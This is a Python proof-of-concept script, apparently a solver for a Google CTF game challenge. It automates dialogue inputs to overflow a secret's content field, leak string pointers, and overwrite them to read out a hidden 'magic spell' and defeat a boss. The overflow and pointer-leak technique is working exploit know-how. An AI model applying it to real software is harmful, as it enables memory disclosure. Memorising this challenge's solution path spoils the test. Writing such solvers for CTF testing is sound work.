# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from poc.helper import ReplayHelper


# Fallback if this doesn't work:
# python3 -m poc.record --map=dialogue_boss
# Walk up to the boss, start a convo
# Send in "write", "3", rewrite title to 16 A chars, content to 16 B chars.
# See secret list again, verify that there's some binary data leaking.
# Next, send in "write" "4", rewrite title to anything, rewrite content to a lot of 'z' characters (addr of the secret)
# See secret list, verify that the secret string is present
# Exit the boss convo and enter the secret str
def replay_iter_func(replay):
    replay.enter_map("dialogue_boss")
    replay.teleport(810, 416)
    replay.enqueue([''] * 90)
    yield
    # Select "I know the spell".
    replay.enqueue(['e'] + [''])
    yield
    while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.enqueue(['e'] + [''])
    yield
    # Enter random option, get to secret input menu.
    while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.game.textbox.text_input.text = "Hello"
    replay.enqueue(['N'] + [''])
    yield
    # Select "View secrets"
    while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.enqueue(['e'] + [''])
    yield
    # Overflow 3rd Domino secret with 16 bytes to see the secret structs that come after it.
    while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.game.textbox.text_input.text = "3"
    replay.enqueue([''] + ['N'] + [''])
    yield
    # Select 'Write'
    while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.enqueue(['s'] + [''] + ['e'] + [''])
    yield
    # Set title.
    while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.game.textbox.text_input.text = "Title"
    replay.enqueue([''] + ['N'] + [''])
    yield
    # Set content to the overflow value.
    while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.game.textbox.text_input.text = "A"*16
    replay.enqueue([''] + ['N'] + [''])
    yield
    # Select "read new secrets"
    while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.enqueue(['e'] + [''])
    yield
    # Scroll through new secrets.
    while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
    # View the secret we just wrote.
    replay.game.textbox.text_input.text = "3"
    replay.enqueue([''] + ['N'] + [''])
    while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.enqueue(['e'] + [''] + ['e'] + ['']) # Read
    yield
    # Wait for text to be sent by server.
    while replay.game.textbox.text is None:
        replay.enqueue([''])
        yield
    txt = replay.game.textbox.text
    txt = txt[txt.find("A"*16)+16:] # These are all string ptrs.
    # View another secret
    while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.enqueue(['e'] + [''])
    yield
    # Scroll through dialogue.
    while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
    ptrs = [c for c in txt]
    strings = [None]*len(ptrs) # String vals of the ptrs
    strings[0] = "Domino" # First ptr is the player name string.
    # Let's get the remaining strings by overwriting the first pointer
    # with all others and seeing how the 'Domino' text changes.
    for i in range(len(ptrs)):
      if i == 0:
        continue
      ptr = ptrs[i]
      replay.game.textbox.text_input.text = "3"
      replay.enqueue([''] + ['N'] + [''])
      yield
      # Select 'Write'
      while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
      replay.enqueue(['s'] + [''] + ['e'] + [''])
      replay.enqueue(['e'] + [''])
      yield
      # Set title.
      while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
      replay.game.textbox.text_input.text = "Title"
      replay.enqueue([''] + ['N'] + [''])
      yield
      # Overwrite all the ptrs after the content with the test ptr.
      while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
      replay.game.textbox.text_input.text = "A"*16 + ptr
      replay.enqueue([''] + ['N'] + [''])
      yield
      # View new secrets
      while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
      replay.enqueue(['e'] + [''])
      yield
     # Scroll through new secrets.
      while not replay.game.textbox.free_text_active():
        replay.enqueue(['e'] + [''])
        yield
      # Wait for text to be sent by server.
      while replay.game.textbox.text is None:
        replay.enqueue([''])
        yield
      # The 1st secret's modifier title is the value the ptr pointed to.
      txt = replay.game.textbox.text
      strings[i] = txt.split("1: ")[1].split(" (owner:")[0]
      if i > 0 and strings[i-1] == "The magic spell":
          break

    print(strings)
    secret = None
    # The secret is the content of the magic spell slot,
    # so whatever comes after the magic spell string.
    for i in range(len(strings)):
      if strings[i] == "The magic spell":
        secret = strings[i+1]
        break
    assert secret is not None
    print("Secret: [%s]" %secret)

    # Exit dialogue.
    replay.game.textbox.text_input.text = "-1"
    replay.enqueue([''] + ['N'] + [''])
    yield
    # No more secrets.
    while not replay.game.textbox.choices_active():
      replay.enqueue(['e'] + [''])
      yield
    replay.enqueue(['s'] + [''])
    yield
    while replay.game.textbox is not None:
        replay.enqueue(['e'] + [''])
        yield

    # Start a new dialogue and enter the secret.
    replay.enqueue(['e'] + [''])
    yield
    while not replay.game.textbox.choices_active():
        replay.enqueue(['e'] + [''])
        yield
    replay.enqueue(['e'] + [''])
    yield
    while not replay.game.textbox.free_text_active():
      replay.enqueue(['e'] + [''])
      yield
    replay.game.textbox.text_input.text = secret
    replay.enqueue([''] + ['N'] + [''])
    yield
    # Scroll through destruction dialogue.
    while replay.game.textbox is not None:
        replay.enqueue(['e'] + [''])
        yield
    # Wait for destruction.
    replay.enqueue(['']*300)
    yield
    # Check that the boss was defeated.
    found = False
    for f in replay.game.match_flags.flags:
        if f.name == "dialogue_boss" and f.collected_time > 0:
            found = True
            break
    assert found
    replay.exit()
if __name__ == '__main__':
  replay = ReplayHelper()
  replay.start_game(replay_iter_func)
